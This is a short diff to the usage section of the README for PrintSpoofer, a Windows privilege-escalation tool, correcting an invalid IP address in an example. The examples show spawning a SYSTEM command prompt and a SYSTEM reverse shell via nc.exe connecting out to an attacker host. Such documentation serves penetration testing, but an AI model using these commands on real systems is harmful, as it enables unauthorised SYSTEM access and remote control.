@@ -30,7 +30,7 @@ Examples:
   - Spawn a SYSTEM command prompt on the currently active desktop
       PrintSpoofer.exe -d -c cmd.exe
   - Get a SYSTEM reverse shell
-      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.1337 1337 -e cmd"
+      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
 ```
 
 ### Example 1: Spawn a SYSTEM command prompt in the current console
